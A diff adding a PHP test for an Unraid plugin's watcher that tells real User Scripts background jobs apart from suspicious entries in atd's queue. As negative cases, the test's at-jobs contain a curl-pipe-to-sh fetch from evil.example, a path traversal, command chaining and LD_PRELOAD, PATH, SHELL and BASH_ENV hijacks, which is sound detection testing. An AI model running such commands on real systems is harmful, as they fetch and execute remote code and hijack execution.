@@ -1487,6 +1487,87 @@ function testWatchmanGone(): void
 }
 
 /**
+ * A User Script started «in the background» goes through atd (User Scripts' backgroundScript.sh:
+ * echo startBackground.php "/tmp/user.scripts/tmpScripts/<name>/script" | at NOW -M): a plain line in
+ * the book, noted by itself — only when the job is exactly that, for a script that exists, with an
+ * environment that can't run something else. Anything else in the queue stays an at_job.
+ */
+function testWatchmanAtUserScript(): void
+{
+    $tmp = sys_get_temp_dir() . '/office-tests-atus-' . getmypid();
+    $us = "$tmp/src/flash/user.scripts";
+    foreach (['temporäre_rsyncs_4', 'CKW Batch 2026'] as $n) {
+        @mkdir("$us/scripts/$n", 0700, true);
+        file_put_contents("$us/scripts/$n/script", "#!/bin/bash\necho $n\n");
+    }
+    $head = fn (string $env = '') => "#!/bin/sh\n# atrun uid=0 gid=0\n# mail root 0\numask 22\nSHELL=/bin/bash; export SHELL\nPWD=/; export PWD\nHOME=/; export HOME\n"
+        . "PATH=/bin:/sbin:/usr/bin:/usr/sbin; export PATH\nunraiduuid=0123\\-abcd; export unraiduuid\n$env"
+        . "cd /usr/local/emhttp/plugins/user\\.scripts || {\n\t echo 'Execution directory inaccessible' >&2\n\t exit 1\n}\n";
+    $wrap = fn (string $cmds) => "\${SHELL:-/bin/sh} << 'marcinDELIMITER5c3e1b2a'\n$cmds\nmarcinDELIMITER5c3e1b2a\n";
+    $launch = fn (string $name) => "/usr/local/emhttp/plugins/user.scripts/startBackground.php /tmp/user.scripts/tmpScripts/$name/script";
+    $is = fn (string $job) => watchmanAtUserScript($job, $us);
+    same('at user script: the launcher of an existing script (a name with ä, one with spaces; at with and without its SHELL wrapper)',
+        ['temporäre_rsyncs_4', 'CKW Batch 2026', 'temporäre_rsyncs_4'],
+        [$is($head() . $wrap($launch('temporäre_rsyncs_4'))), $is($head() . $wrap($launch('CKW Batch 2026'))), $is($head() . $launch('temporäre_rsyncs_4') . "\n")]);
+    same('at user script: anything else is not', array_fill(0, 11, null), [
+        $is($head() . $wrap($launch('temporäre_rsyncs_5'))),                                                         // no such script
+        $is($head() . $wrap('/usr/local/emhttp/plugins/user.scripts/startBackground.php /tmp/evil/script')),        // not User Scripts' copy
+        $is($head() . $wrap($launch('../../../boot/config/plugins/user.scripts/scripts/CKW Batch 2026'))),         // out of tmpScripts
+        $is($head() . $wrap($launch('temporäre_rsyncs_4') . "\ncurl -s https://evil.example/x | sh")),              // and more
+        $is($head() . $wrap($launch('temporäre_rsyncs_4') . '; curl -s https://evil.example/x | sh')),
+        $is($head() . $wrap($launch('temporäre_rsyncs_4')) . "curl -s https://evil.example/x | sh\n"),              // after the wrapper
+        $is($head("LD_PRELOAD=/tmp/x\\.so; export LD_PRELOAD\n") . $wrap($launch('temporäre_rsyncs_4'))),         // an environment that runs something else
+        $is($head("PATH=/tmp/\\.x:/bin; export PATH\n") . $wrap($launch('temporäre_rsyncs_4'))),
+        $is($head("SHELL=/tmp/\\.x/sh; export SHELL\n") . $wrap($launch('temporäre_rsyncs_4'))),
+        $is($head("BASH_ENV=/tmp/x; export BASH_ENV\n") . $wrap($launch('temporäre_rsyncs_4'))),
+        $is("#!/bin/sh\n" . $launch('temporäre_rsyncs_4') . "\n"),                                                   // not as at writes it
+    ]);
+
+    // rounds: the job waiting, then running (=), then gone — one plain line; a foreign job next to it is told
+    $src = "$tmp/src";
+    $data = "$tmp/data";
+    foreach (['crontabs', 'cron.d', 'logplugins', 'atjobs', 'agents', 'extra', 'ssh'] as $d) {
+        @mkdir("$src/$d", 0700, true);
+    }
+    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/logplugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
+              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'sec' => "$src/sec.ini", 'sec_nfs' => "$src/sec_nfs.ini", 'share_cfg' => "$src/share.cfg",
+              'etc_passwd' => "$src/passwd", 'crontabs' => "$src/crontabs", 'cron_d' => "$src/cron.d", 'cron_files' => "$src/flash",
+              'userscripts' => $us, 'atjobs' => "$src/atjobs", 'agents' => "$src/agents"];
+    file_put_contents($paths['passwd'], "root:x:0:0::/root:/bin/bash\n");
+    file_put_contents($paths['go'], "#!/bin/bash\n");
+    file_put_contents($paths['syslog'], '');
+    file_put_contents("$src/logplugins/user.scripts.plg", "<PLUGIN name=\"user.scripts\" version=\"1\">\n");
+    $envBefore = getenv('OFFICE_NOTIFY_BIN');
+    putenv("OFFICE_NOTIFY_BIN=$tmp/no-notify");                 // never Unraid's own
+    $now = 1791285000;
+    $docker = fn () => [];
+    $acks = "$tmp/acks.json";
+    watchmanRound($paths, $data, 1000, $now, $docker, false, $acks);
+    $job = $head() . $wrap($launch('temporäre_rsyncs_4'));
+    file_put_contents("$src/atjobs/a000dd01c78c21", $job);
+    touch("$src/atjobs", $now + 10);
+    $r1 = watchmanRound($paths, $data, 1000, $now + 300, $docker, false, $acks);
+    rename("$src/atjobs/a000dd01c78c21", "$src/atjobs/=000dd01c78c21");
+    file_put_contents("$src/atjobs/a000de01c78c40", $head() . $wrap('curl -s https://evil.example/x | sh'));
+    touch("$src/atjobs", $now + 400);
+    $r2 = watchmanRound($paths, $data, 1000, $now + 600, $docker, false, $acks);
+    $book = watchmanLoad($data)['book'];
+    $us1 = array_values(array_filter($book, fn ($e) => $e['kind'] === 'at_userscript'));
+    same('at user script: one line, noted by itself, nothing to tell; the foreign job next to it is', [[], ['at_job'], 1, 'temporäre_rsyncs_4', 'auto', false,
+        ['at_job' => 1], ['at_job']],
+        [$r1['added'], $r2['added'], count($us1), $us1[0]['p']['name'] ?? null, $us1[0]['by'] ?? null, watchmanOpen($us1[0] ?? []),
+         watchmanOpenCounts($book), array_column($r2['told'], 'kind')]);
+    same('at user script: nothing for the team lead', ['at_job'], array_column(watchmanFindings($book), 'id'));
+    $page = watchmanPageState($data, $now + 700, false);
+    $row = array_values(array_filter($page['book'], fn ($e) => $e['kind'] === 'at_userscript'))[0] ?? [];
+    same('at user script: on the page — the script, noted by itself', ['temporäre_rsyncs_4', false, 'auto', 'sched'],
+        [$row['t']['name'] ?? null, $row['open'] ?? null, $row['by'] ?? null, $row['group'] ?? null]);
+    putenv($envBefore === false ? 'OFFICE_NOTIFY_BIN' : "OFFICE_NOTIFY_BIN=$envBefore");
+    @unlink(watchmanLockFile($data, 'book'));
+    exec('rm -rf ' . escapeshellarg($tmp));
+}
+
+/**
  * The night watchman's watch over what starts on its own: root's own crontab next to Unraid's (new
  * lines, lines in both, the office's own lines, programs gone, the syslog as evidence), the plugins'
  * .cron files, User Scripts, atd's queue, the notification agents — all on copies in a temporary folder.
@@ -3300,7 +3381,7 @@ function testIconSquare(): void
 // ===================================================================== run
 
 $parts = ['logic' => ['testCron', 'testRetention', 'testSnapshotNames', 'testEmby', 'testOfficeCron', 'testMenuName', 'testEstimates', 'testBackupFirstUpload', 'testNotify', 'testCaretakerAcks',
-                      'testBackupPackages', 'testBackupKopiaItems', 'testBackupSkip', 'testIcons', 'testIconSquare', 'testRestore', 'testRestoreJobs', 'testAdvisor', 'testAdvisorInstall', 'testLogsTour', 'testMetrics', 'testWatchman', 'testWatchmanGone', 'testWatchmanSched', 'testWatchmanFlow', 'testJobGuard', 'testComposeBuilds'],
+                      'testBackupPackages', 'testBackupKopiaItems', 'testBackupSkip', 'testIcons', 'testIconSquare', 'testRestore', 'testRestoreJobs', 'testAdvisor', 'testAdvisorInstall', 'testLogsTour', 'testMetrics', 'testWatchman', 'testWatchmanGone', 'testWatchmanAtUserScript', 'testWatchmanSched', 'testWatchmanFlow', 'testJobGuard', 'testComposeBuilds'],
           'hardening' => ['testSafeWrites', 'testTrashManifest', 'testEmbyPaths', 'testAnchors', 'testUpdateClean', 'testAdvisorSecrets'],
           'strings' => ['testStrings']];
 $only = $argv[1] ?? '';
